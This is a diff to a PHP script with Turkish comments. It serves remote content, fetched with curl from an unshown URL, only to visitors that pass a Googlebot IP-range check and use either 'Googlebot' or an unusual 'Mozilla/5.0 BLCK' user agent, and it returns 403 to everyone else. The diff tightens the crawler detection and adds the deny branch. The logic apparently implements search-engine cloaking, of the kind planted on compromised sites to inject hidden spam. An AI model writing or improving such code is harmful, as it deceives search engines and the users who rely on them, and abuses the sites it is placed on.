@@ -4,17 +4,25 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
 // Google IP doğrulama fonksiyonu
 function isGoogleBot($ip) {
-    $host = gethostbyaddr($ip);
-    return (
-        stripos($host, 'googlebot.com') !== false ||
-        stripos($host, 'google.com') !== false
-    ) && gethostbyname($host) === $ip;
+    $googleIpRanges = [
+        '66.249.64.0/19', // Örnek Google IP aralıkları
+        '64.233.160.0/19',
+        '72.14.192.0/18',
+    ];
+
+    foreach ($googleIpRanges as $range) {
+        list($subnet, $mask) = explode('/', $range);
+        if ((ip2long($ip) & ~((1 << (32 - $mask)) - 1)) === ip2long($subnet)) {
+            return true;
+        }
+    }
+    return false;
 }
 
-// Ekstra kullanıcı ajanları
+// İzin verilen kullanıcı ajanları
 $allowedUserAgents = [
     'Googlebot',
-    'Mozilla/5.0 BLCK (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36'
+    'Mozilla/5.0 BLCK'
 ];
 
 // Kullanıcı ajanını kontrol et
@@ -38,7 +46,7 @@ if ($isAllowedUserAgent && isGoogleBot($ipAddress)) {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // SSL hatalarını yok sayar
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // SSL doğrulaması etkin
     $content = curl_exec($ch);
     curl_close($ch);
 
@@ -46,6 +54,11 @@ if ($isAllowedUserAgent && isGoogleBot($ipAddress)) {
     echo $content;
 
     // İleride başka işlemler yapılmasını engelle
+    exit;
+} else {
+    // Erişim reddedildiğinde mesaj göster
+    http_response_code(403);
+    echo "Erişim reddedildi.";
     exit;
 }
 ?>
